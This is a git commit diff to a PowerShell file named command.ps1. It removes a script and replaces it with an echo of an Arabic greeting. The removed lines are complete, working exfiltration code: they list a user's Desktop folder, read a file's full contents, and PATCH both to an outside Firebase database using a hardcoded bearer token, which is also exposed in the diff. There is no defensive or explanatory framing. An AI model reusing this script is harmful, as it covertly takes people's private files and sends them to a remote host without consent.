540e35ac622ff84320cdd4f0eb115305ce9db031
J9133 <jad.salim.13.2011@gmail.com>
2025-12-27 14:19:16 +0200

    Update command.ps1

--- command.ps1
+++ command.ps1
@@ -1,13 +1,1 @@
-$IdToken = "wDPdQ8YJVhsqWLfor35E7Ywwe13qSrgoRFZ3dZNt"
-$DatabaseUrl = "https://skreanshots-default-rtdb.firebaseio.com/files.json"
-$FolderPath  = "C:\Users\Admin\Desktop"
-$FilePath    = "C:\Users\Admin\Desktop\test.txt"
-
-$Data = @{}
-if ($FolderPath -ne "" -and (Test-Path $FolderPath)) { $Data.folder_items = Get-ChildItem $FolderPath -Force | Select-Object -ExpandProperty Name }
-if ($FilePath -ne "" -and (Test-Path $FilePath)) { $Data.file_name = (Get-Item $FilePath).Name; $Data.file_content = Get-Content $FilePath -Raw }
-if ($Data.Count -eq 0) { exit }
-
-$Json = $Data | ConvertTo-Json -Depth 5
-$Headers = @{ "Authorization" = "Bearer $IdToken" }
-Invoke-RestMethod -Uri $DatabaseUrl -Method PATCH -Body $Json -ContentType "application/json" -Headers $Headers
+echo "مرحبا"
